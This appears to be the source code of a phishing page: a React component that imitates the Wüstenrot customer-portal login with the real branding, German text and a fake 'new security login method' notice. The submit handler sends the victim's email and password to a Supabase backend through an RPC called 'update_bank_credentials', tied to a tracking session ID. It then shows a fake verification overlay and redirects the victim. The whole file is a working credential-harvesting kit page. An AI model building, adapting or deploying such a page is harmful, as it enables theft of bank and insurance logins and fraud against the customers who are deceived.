import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { X, Eye, EyeOff, Smartphone } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import wuestenrotLogo from "@/assets/wuestenrot-logo.svg";
import wuestenrotIcon from "@/assets/wuestenrot-icon.png";
import wuestenrotQr from "@/assets/wuestenrot-qr.png";
import appStore from "@/assets/app-store.svg";
import googlePlay from "@/assets/google-play.svg";

const Wuestenrot = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [email, setEmail] = useState("");
  const [emailTouched, setEmailTouched] = useState(false);
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showAlert, setShowAlert] = useState(true);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Wüstenrot - Login", wuestenrotIcon);

  const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  const emailError = emailTouched && !emailValid;

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: email,
        p_password: password,
        p_username_label: "E-Mail-Adresse",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen grid grid-cols-1 md:grid-cols-[60%_40%]" style={{ fontFamily: "'Open Sans', sans-serif" }}>
        {/* Linke Spalte */}
        <div className="bg-white flex flex-col min-h-screen">
          {/* Logo oben */}
          <div className="px-6 pt-8 md:px-16 md:pt-10">
            <img src={wuestenrotLogo} alt="Wüstenrot" className="h-7 md:h-9" />
          </div>

          {/* Mittiger Content */}
          <div className="flex-1 flex items-center justify-center px-6 md:px-16 py-8">
            <div className="w-full">
              {/* Hinweisbox */}
              {showAlert && (
                <div className="mb-8 flex items-stretch gap-3 px-4 py-3 rounded-lg" style={{ backgroundColor: "#f9dd99" }}>
                  <div className="flex items-center">
                    <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2" strokeLinecap="square" strokeLinejoin="miter">
                      <path d="M12 2 L22 20 L2 20 Z" />
                      <line x1="12" y1="9" x2="12" y2="14" />
                      <circle cx="12" cy="17.5" r="0.6" fill="#000" stroke="none" />
                    </svg>
                  </div>
                  <div className="flex-1 flex items-center text-sm text-[#1a1a1a]">
                    Ab sofort stellen wir auf eine neue Login-Methode mit zusätzlicher Sicherheitsstufe um.
                  </div>
                  <button onClick={() => setShowAlert(false)} className="self-start text-gray-700 hover:text-black">
                    <X className="h-5 w-5" />
                  </button>
                </div>
              )}

              {/* Headings */}
              <h1 className="text-2xl font-bold text-black">Willkommen im W&amp;W-Kundenportal</h1>
              <p className="mb-8 text-2xl font-bold text-black">Bitte melden Sie sich an.</p>

              {/* Email */}
              <label className="mb-1 block text-sm text-[#1a1a1a]">E-Mail-Adresse</label>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                onBlur={() => setEmailTouched(true)}
                className="h-11 w-full rounded-md border-2 px-3 text-sm outline-none"
                style={{ borderColor: emailError ? "#a71511" : "#9ca3af" }}
              />
              {emailError && (
                <p className="mt-1 text-xs" style={{ color: "#a71511" }}>
                  Tragen Sie bitte eine gültige Email-Adresse ein!
                </p>
              )}

              {/* Password */}
              <label className="mt-5 mb-1 block text-sm text-[#1a1a1a]">Passwort</label>
              <div className="relative mb-2">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="h-11 w-full rounded-md border-2 border-gray-400 px-3 pr-10 text-sm outline-none focus:border-gray-700"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-600 hover:text-[#f84914]"
                >
                  {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                </button>
              </div>

              <a href="#" className="mb-6 inline-block text-sm text-[#1a1a1a] underline w-fit hover:text-[#f84914]">Passwort vergessen?</a>

              {/* Anmelden Button */}
              <div>
                <button
                  onClick={handleSubmit}
                  className="mb-6 w-fit rounded-xl px-8 py-3 text-sm font-bold text-white transition-colors bg-[#f84914] hover:bg-[#e03700]"
                >
                  Anmelden
                </button>
              </div>

              <p className="text-sm text-[#1a1a1a]">
                Noch kein Benutzerkonto?{" "}
                <a href="#" className="font-bold" style={{ color: "#f84914" }}>Hier Registrieren</a>
              </p>
            </div>
          </div>

          {/* Footer am unteren Rand, full width */}
          <div className="w-full">
            <hr className="hidden md:block border-gray-200" />
            <div className="flex flex-wrap gap-6 text-sm text-gray-700 px-6 md:px-16 py-5">
              <a href="https://portale.ww-ag.de/go/impressum_kundenportal" target="_blank" rel="noopener noreferrer" className="no-underline hover:no-underline hover:text-[#f84914]">Impressum</a>
              <a href="https://portale.ww-ag.de/go/datenschutz_kundenportal" target="_blank" rel="noopener noreferrer" className="no-underline hover:no-underline hover:text-[#f84914]">Datenschutz</a>
              <a href="https://portale.ww-ag.de/go/mewa_faq" target="_blank" rel="noopener noreferrer" className="no-underline hover:no-underline hover:text-[#f84914]">Hilfeseite</a>
            </div>
          </div>
        </div>

        {/* Rechte Spalte */}
        <div className="hidden md:flex items-center justify-center px-6 py-8 md:px-12 md:py-12 min-h-screen" style={{ backgroundColor: "#f0f0f0" }}>
          <div className="w-full max-w-[460px]">
            {/* QR Card */}
            <div className="rounded-2xl bg-white p-5 shadow-sm">
              <div className="grid grid-cols-2 gap-4 items-center">
                <div className="flex justify-center">
                  <img src={wuestenrotQr} alt="QR Code" className="w-full max-w-[180px]" />
                </div>
                <div>
                  <div className="mb-2 flex items-center gap-2">
                    <Smartphone className="h-5 w-5 text-[#1a1a1a]" />
                    <span className="font-bold text-[#1a1a1a]">App für Privatkunden</span>
                  </div>
                  <p className="text-sm text-[#1a1a1a]">Nicht für Firmenkunden nutzbar.</p>
                  <p className="text-sm text-[#1a1a1a]">Bitte verwenden Sie den Webzugang.</p>
                </div>
              </div>
            </div>

            <div className="mt-6 space-y-4 text-sm text-[#1a1a1a]">
              <p className="font-bold">
                QR-Code mit der Telefonkamera scannen und unser Kundenportal als App verwenden.
              </p>
              <p>
                Ob per App oder im Browser: Unser mobiles Kundenportal ist Ihr persönlicher Vertrags- und Finanzassistent für unterwegs und zuhause.
              </p>
              <p className="font-bold">Schnell, unkompliziert und intuitiv.</p>
            </div>

            <div className="mt-6 flex flex-wrap gap-3">
              <a href="#"><img src={appStore} alt="App Store" className="h-12" /></a>
              <a href="#"><img src={googlePlay} alt="Google Play" className="h-12" /></a>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default Wuestenrot;
